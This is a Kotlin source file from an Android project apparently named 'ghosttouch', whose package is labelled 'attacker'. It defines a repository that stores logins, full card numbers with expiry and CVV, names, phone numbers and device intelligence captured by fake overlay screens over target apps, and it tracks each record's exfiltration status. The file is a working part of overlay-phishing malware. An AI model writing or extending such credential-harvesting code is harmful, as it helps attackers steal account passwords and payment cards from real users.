package com.ghosttouch.attacker.capture

import android.util.Log
import com.ghosttouch.common.model.CaptureSession
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import java.time.Instant
import java.time.ZoneId
import java.time.format.DateTimeFormatter

/**
 * In-memory repository for captured overlay sessions.
 *
 * Stores [CaptureSession] objects from overlay interactions including
 * device intelligence collected at capture time.
 *
 * Uses [StateFlow] so Compose UI automatically recomposes when sessions change.
 */
object SessionRepository {

    private const val TAG = "SessionRepository"

    private val _sessions = MutableStateFlow<List<CaptureSession>>(emptyList())
    val sessions: StateFlow<List<CaptureSession>> = _sessions.asStateFlow()

    private val formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
        .withZone(ZoneId.systemDefault())

    /**
     * Records a captured login session with device intel.
     */
    fun captureLogin(
        targetApp: String,
        email: String,
        password: String,
        deviceIntel: Map<String, String> = emptyMap()
    ): CaptureSession {
        val session = CaptureSession(
            id = System.currentTimeMillis(),
            targetApp = targetApp,
            email = email,
            password = password,
            timestamp = formatter.format(Instant.now()),
            overlayType = "login",
            deviceIntel = deviceIntel
        )
        _sessions.update { current -> listOf(session) + current }
        Log.d(TAG, "LOGIN session stored: id=${session.id}, intel=${deviceIntel.size} fields")
        return session
    }

    /**
     * Records a captured payment session with device intel.
     */
    fun capturePayment(
        targetApp: String,
        cardNumber: String,
        expiry: String,
        cvv: String,
        deviceIntel: Map<String, String> = emptyMap()
    ): CaptureSession {
        val session = CaptureSession(
            id = System.currentTimeMillis(),
            targetApp = targetApp,
            email = "Card: *${cardNumber.takeLast(4)}",
            password = "Exp: $expiry / CVV: $cvv",
            cardNumber = cardNumber,
            timestamp = formatter.format(Instant.now()),
            overlayType = "payment",
            deviceIntel = deviceIntel
        )
        _sessions.update { current -> listOf(session) + current }
        Log.d(TAG, "PAYMENT session stored: id=${session.id}, intel=${deviceIntel.size} fields")
        return session
    }

    /**
     * Records a comprehensive capture-all session with all field data + device intel.
     */
    fun captureAll(
        targetApp: String,
        fields: Map<String, String>,
        deviceIntel: Map<String, String> = emptyMap()
    ): CaptureSession {
        val email = fields["email"] ?: ""
        val password = fields["password"] ?: ""
        val name = fields["name"] ?: ""
        val phone = fields["phone"] ?: ""
        val card = fields["card"] ?: ""
        val expiry = fields["expiry"] ?: ""

        val summary = buildString {
            if (email.isNotBlank()) append("Email: $email\n")
            if (name.isNotBlank()) append("Name: $name\n")
            if (phone.isNotBlank()) append("Phone: $phone\n")
            if (card.isNotBlank()) append("Card: *${card.takeLast(4)}\n")
            if (expiry.isNotBlank()) append("Exp: $expiry\n")
        }.trimEnd()

        val session = CaptureSession(
            id = System.currentTimeMillis(),
            targetApp = targetApp,
            email = summary.ifEmpty { "No data captured" },
            password = password,
            cardNumber = card,
            timestamp = formatter.format(Instant.now()),
            overlayType = "capture_all",
            deviceIntel = deviceIntel
        )
        _sessions.update { current -> listOf(session) + current }
        Log.d(TAG, "CAPTURE_ALL session stored: id=${session.id}, fields=${fields.size}, intel=${deviceIntel.size}")
        return session
    }

    fun updateExfilStatus(sessionId: Long, encodedPayload: String, status: String) {
        _sessions.update { current ->
            current.map { session ->
                if (session.id == sessionId) {
                    session.copy(encodedPayload = encodedPayload, exfilStatus = status)
                } else session
            }
        }
    }

    fun clear() {
        _sessions.value = emptyList()
    }
}
